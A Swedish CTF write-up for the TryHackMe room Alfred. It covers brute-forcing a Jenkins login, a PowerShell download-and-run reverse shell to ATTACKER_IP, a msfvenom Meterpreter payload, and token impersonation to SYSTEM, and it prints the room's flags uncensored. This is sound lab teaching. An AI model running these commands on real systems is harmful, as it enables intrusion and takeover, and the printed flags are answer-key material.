---
title: "Alfred Writeup"
date: 2023-06-13
tags: [writeup, ctf, tryhackme]
description: "Bruteforcea en Jenkins-inloggning med Burp Intruder och kedja sedan ihop ett PowerShell-reverse-shell med token impersonation privesc på TryHackMe-rummet Alfred."
---

Tjena!

Innan du går vidare ville jag bara säga att om du är nybörjare: ANVÄND INTE DEN HÄR WRITEUPEN SOM EN ENKEL GENVÄG. Försök att gå tillbaka till de tidigare tränings-/inforummen och repetera dem, och ge sedan rummet ett försök till. Jag har inkluderat svaren och flaggorna är _inte censurerade_. Men det betyder inte att du bara ska kopiera och klistra in dem och nöja dig med det. Använd bara detta om du verkligen har kört fast helt.

Med det sagt, hoppas jag att detta är till hjälp 😄

## Setup 

Vi måste först ansluta till tryhackmes VPN-server. Du kan få mer information om detta genom att besöka sidan [Access](https://tryhackme.com/access).

Jag använder openvpn för att ansluta till servern. Här är kommandot:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

En snabb `nmap`-skanning ger oss lite användbara detaljer:
```shell-session
$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

> Hur många portar är öppna? (endast TCP)
>
> Svar: 3

OS-fingerprinting för att hitta en lämplig attackvektor:
```shell-session
$ sudo nmap -O -Pn -vv TARGET_IP
...
...
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
```

Vi kan vara säkra på att servern kör någon typ av Windows-OS. Det finns en http-server som körs på port 80 och en proxy på port 8080. Om vi besöker webbplatsen på port 80 ser vi:
![Port 80 web-page](/assets/img/writeup_assets/alfred/port-80-page.png)

När vi besöker sidan på port 8080 möts vi av följande:
![Port 8080 page](/assets/img/writeup_assets/alfred/port-8080-login.png)

Webbsidan är en inloggningsportal, så vi kan använda `hydra` eller Burp Suite Intruder för att bruteforcea detta och få inloggningsuppgifter.

Jag använder Burp Suite för att köra en sniper-attack och få tag på inloggningsuppgifter...
![Burpsuite Intruder Attack](/assets/img/writeup_assets/alfred/burp-intruder.png)
![Sniper Attack](/assets/img/writeup_assets/alfred/sniper-attack.png)



Vi kan försöka logga in på portalen med de uppgifter vi fick fram.

> Vad är användarnamnet och lösenordet för inloggningspanelen (i formatet användarnamn:lösenord)
>
> Svar: `admin:admin`


## Gaining Access

När vi väl är inloggade i portalen ser vi en dashboard som låter användaren göra allt möjligt.
![Dashboard](/assets/img/writeup_assets/alfred/dashboard.png)

Verktyget `New Item` på dashboarden kan sedan användas för att ladda upp en payload som körs för att ge oss åtkomst via ett reverse shell. För att göra det behöver vi först ett reverse TCP-shell som använder PowerShell. Precis som rummet instruerar i sin första uppgift ska vi använda `nishang` för detta PowerShell-skript.

```shell-session
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

När vi har vårt shell kan vi använda `NewItem`-verktyget för att ladda upp filen och få servern att köra följande kommando:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

![](/assets/img/writeup_assets/alfred/initial-access-1.png)

När projektet har skapats omdirigeras vi till konfigurationsdelen där vi kan ange att arbetsflödet ska köra kommandot vi nämnde tidigare:

![](/assets/img/writeup_assets/alfred/initial-access-2.png)

Innan vi går vidare måste vi starta en http-server på vår maskin så att fjärrservern kan ansluta och hämta PowerShell-skriptet.
***OBS***: Skriptfilen måste ligga i den aktuella arbetskatalogen för att detta ska fungera.

```shell-session
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

Vi behöver också starta en listener för vårt reverse shell:
```shell-session
$ nc -nvlp 4445
```

Nu när allt detta är klart kan vi äntligen köra arbetsflödet genom att klicka på alternativet `Build Now` som visas till vänster i projektmenyn. Det ger oss ett shell att jobba med:
```shell-session
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\alfred> cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

Vi har lyckats få tag på användarflaggan, och nu kan vi gå vidare till att eskalera våra behörigheter.

> Vad är user.txt-flaggan?
>
> Svar: `79007a09481963edf2e1321abd9ae2a0`

## Privilege Escalation

För att göra det smidigare för oss använder vi ett Meterpreter-shell för eskaleringsdelen. Först behöver vi generera en payload för ett reverse shell:
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
```
Vi behöver en listener på vår maskin:
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
LHOST => ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT PORT
LPORT => PORT

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on ATTACKER_IP:PORT
```


Vi laddar upp den till maskinen genom att lägga till ett byggsteg i projektets konfiguration:
```powershell
powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/shell.exe','shell.exe')"
```

När vi bygger projektet får vi det tidigare shellet, där vi kan köra följande kommando:
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\alfred> Start-Process shell.exe
```

Detta startar vårt Meterpreter-shell.


> Vad är den slutgiltiga storleken på den exe-payload du genererade?
>
> Svar: `73802`

Nu när vi har ett trevligt Meterpreter-shell kan vi kika på vilka behörigheter vi har:
```shell-session
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

Som användaren `alfred` har vi behörigheterna `SeDebugPrivilege`, `SeImpersonatePrivilege` och `SeCreateGlobalPrivilege` aktiverade. När vi läser in modulen `incognito` kan vi använda den för att lista tokens:

```shell-session
PS > ^C
Terminate channel 1? [y/N]  y                                                             
meterpreter > load incognito                                                              
Loading extension incognito...Success.                                                    
meterpreter > list_tokens -g                                                              
[-] Warning: Not currently running as SYSTEM, not all tokens will be available            
             Call rev2self if primary process token is SYSTEM                             
                                                                                          
Delegation Tokens Available                                                               
========================================                                                  
\                                                                                         
BUILTIN\Administrators                                                                    
BUILTIN\IIS_IUSRS                                                                         
BUILTIN\Users                                                                             
NT AUTHORITY\Authenticated Users                                                          
NT AUTHORITY\NTLM Authentication                                                          
NT AUTHORITY\SERVICE                                                                      
NT AUTHORITY\This Organization                                                            
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\swprv
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\VSS
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

Eftersom `BUILTIN\Administrators`-tokenen är tillgänglig kan vi använda följande kommando för att impersonera admintokenen:
```shell-session
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Genom att köra kommandot `getuid` kan vi bekräfta att vi har administratörsbehörighet:
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Vad blir outputen när du kör kommandot getuid?
>
> Svar: `NT AUTHORITY\SYSTEM`

Precis som uppgiften råder oss att göra migrerar vi nu den här processen:
```shell-session
meterpreter > ps
...

668   580   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\se
                                                                  rvices.exe
...

meterpreter > migrate 668
[*] Migrating from 2176 to 668...
[*] Migration completed successfully.
meterpreter > cat "C:\Windows\System32\config\root.txt" 
��dff0f748678f280250f25a45b8046b4a
```

> läs filen root.txt på `C:\Windows\System32\config`
>
> Svar: `dff0f748678f280250f25a45b8046b4a`

## Conclusion

Om den här writeupen hjälpte, överväg gärna att följa mig på [github](https://github.com/NovusEdge) och/eller ge repot en stjärna: https://github.com/NovusEdge/thm-writeups


- Room: [Alfred](https://tryhackme.com/room/alfred)
